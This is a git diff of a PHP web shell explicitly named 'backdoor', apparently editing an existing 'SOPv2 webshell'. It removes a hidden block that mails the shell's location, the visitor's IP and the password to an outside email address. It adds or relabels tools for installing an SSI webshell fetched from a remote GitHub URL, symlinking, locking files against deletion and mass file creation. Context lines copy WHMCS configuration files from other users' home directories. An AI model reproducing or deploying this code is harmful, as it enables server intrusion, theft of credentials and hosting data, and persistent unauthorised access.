@@ -253,12 +253,7 @@ function myFunction() {
   alert("Copied Successfully!!");
 }
 </script>
-<?php
-$tujuanmail = 'muhrazky@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "cek $x_path  *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ] Pass: [ $pass ]";
-mail($tujuanmail, "SOPv2 webshell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
+
  <?php
 
 echo "Website : " . $_SERVER['HTTP_HOST'] . "";
@@ -496,14 +491,14 @@ $serlokbos = @scandir($serlok);
 
 
 echo '<table class="header"><td><center>
-    <div style="font-family:Bungee Outline;font-size:24px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> backdoor</a></center></div></td><td>';
+    <div style="font-family:Bungee Outline;font-size:20px;"><a href="'.$_SERVER['SCRIPT_NAME'].'"><i class="fa-brands fa-napster"></i> backdoor</a></center></div></td><td>';
 echo '<table align="center"><td>
 <div class="btn-group me-2" role="group" aria-label="First group">
-<button type="button" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i> Home</font></button>
+<button type="button" onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i>kembali ke folder shell</font></button>
 <div class="btn-group me-2" role="group" aria-label="First group">
-<button type="button" onclick=location.href="?path='.$serlok.'&'.net("cmd").'=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i> Console</button>';
+<button type="button" onclick=location.href="?path='.$serlok.'&'.net("cmd").'=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i>Terminal Bypass</button>';
 
-echo '<button type="button" onclick=location.href="?path='.$serlok.'&'.net("upload").'=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i> Upload</button>
+echo '<button type="button" onclick=location.href="?path='.$serlok.'&'.net("upload").'=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i>File Upload</button>
 
 <button type="button" class="btn btn-outline-light"onclick=location.href="?path='.$serlok.'&'.net("info").'=opet"><i class="fa fa-info-circle"></i> information</button>
 
@@ -511,9 +506,9 @@ echo '<button type="button" onclick=location.href="?path='.$serlok.'&'.net("uplo
 
 <button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("buatfolder").'=opet" style="float: right;"><i class="fa-solid fa-folder-plus" style="color:#FAA625;"></i> Create Folder</button>
 
-<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("about").'=opet" style="float: right;"><i class="fa fa-info"></i> About</button>
+<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("about").'=opet" style="float: right;"><i class="fa fa-info"></i>About</button>
 
-<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("tool").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i> Tools</button>
+<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("tool").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i>Hacking Tools</button>
 </td></tr></div>
 </div></div></td></table></table><br>';
 echo '<table class="directory-listing-table"><td><i class="fa fa-folder" style="color:#F19013;"></i> <b>:</b> ';
@@ -745,13 +740,13 @@ if (isset($_GET['viewfile'])) {
 
  } elseif ($_GET[net('tool')] == "opet") {
 echo '<table class="directory-listing-table"><thead><td><center><font color=orange>Select Tools</font><hr>
-<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("grab_config").'=opet">Grab Config</button>
-<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("hashiden").'=opet">Hash Identifier</button>
-<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("ner").'=opet">Adminer</button>
-<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("massdef").'=opet">Mass Deface</button>
-<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("scanshell").'=opet">Shell Finder</button>
-<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("lokfile").'=opet">Lock File</button>
-<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("grab_config").'=opet">Symlinker</button>
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("hashiden").'=opet">Password Hash</button>
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("ner").'=opet">Install SSI Webshell</button>
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("massdef").'=opet">Create File For All Folder</button>
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("scanshell").'=opet">Scanner Shell</button>
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("lokfile").'=opet">Anti Delete Shell / Lock File</button>
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Maintance</button><hr>&nbsp;';
         exit();
 } elseif ($_GET[net('cmd')] == "opet") {
     echo "<table class='directory-listing-table'><td>";
@@ -767,8 +762,8 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
     exit();
 } elseif ($_REQUEST[net('about')] == "opet") {
     echo "<table class='directory-listing-table'><thead><td><div style='font-family: Bungee Outline;font-size:24px;'>
-    <img class='crot' src='https://i.pinimg.com/564x/84/0e/4c/840e4c57fab2ba6279b377ae8dc333d3.jpg'/> Priv shell uwu edition</div><hr>
-    <br> - backdoor shell v2.2 <br> - Created by backdoor</td></thead></table>"; exit();
+    <img class='crot' src='https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/icon.png'/></div><hr>
+    <br> -backdoor</td></thead></table>"; exit();
 } elseif ($_REQUEST[net('lokfile')] == "opet") {
     echo "<table class='directory-listing-table'><td>
     <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='backdoor-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>
@@ -870,7 +865,10 @@ foreach ($hashes as $hash) {
         }
     } exit();
 } elseif ($_GET[net('grab_config')] == "opet") {
-@ini_set('max_execution_time',0); 
+@ini_set("upload_max_filesize", "30M");
+@ini_set("post_max_size", "30M");
+@ini_set("max_execution_time", 300);
+@ini_set("max_input_time", 300);   
 @ini_set('display_errors', 0); 
 @ini_set('file_uploads',1);
 echo '<table class="directory-listing-table"><thead><td>
@@ -960,7 +958,6 @@ copy('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.tx
 copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
 copy('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
 copy('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 
-
 copy('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
 copy('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
 copy('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
@@ -1339,11 +1336,11 @@ echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
         return curl_exec($backdoor);
         curl_close($backdoor);
     } 
-        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i> Adminer<font class='backdoor-text' style='font-size:12px;'><i> v4.8.1</i></font></h5><hr><center>
+        echo "<table class='directory-listing-table'><td><h5><i class='fa fa-database' aria-hidden='true'></i>Server Side Injection<font class='backdoor-text' style='font-size:12px;'><i>SHTML</i></font></h5><hr><center>
     <form method='POST'>
     <div class='input-group' style='width:300px;'>
     <span class='input-group-text mb-2'>Filename :</span>
-    <input type='text' placeholder='adminer.php' class='form-control mb-2' name='miner'></div><br>
+    <input type='text' placeholder='4O3.shtml' class='form-control mb-2' name='miner'></div><br>
         <button type='sumbit' class='btn btn-outline-light' name='gass' style='width:120px;'>Submit</button>&nbsp;
         <a href='?path=".$serlok."&".net('tool')."=opet' class='btn btn-outline-light' style='width:120px;'>Back</a></form></td></table><br>";
     if(isset($_POST['gass'])) {
@@ -1352,7 +1349,7 @@ echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";
         } else {
     $check = $serlok."/".$_POST['miner'];
     $result = str_replace($_SERVER['DOCUMENT_ROOT'], $web."",$check);
-    $content = crot('https://shell.prinsh.com/Nathan/adminer.txt');
+    $content = crot('https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/s.shtml');
     $open = fopen($check, 'w');
     fwrite($open, $content);
     fclose($open);
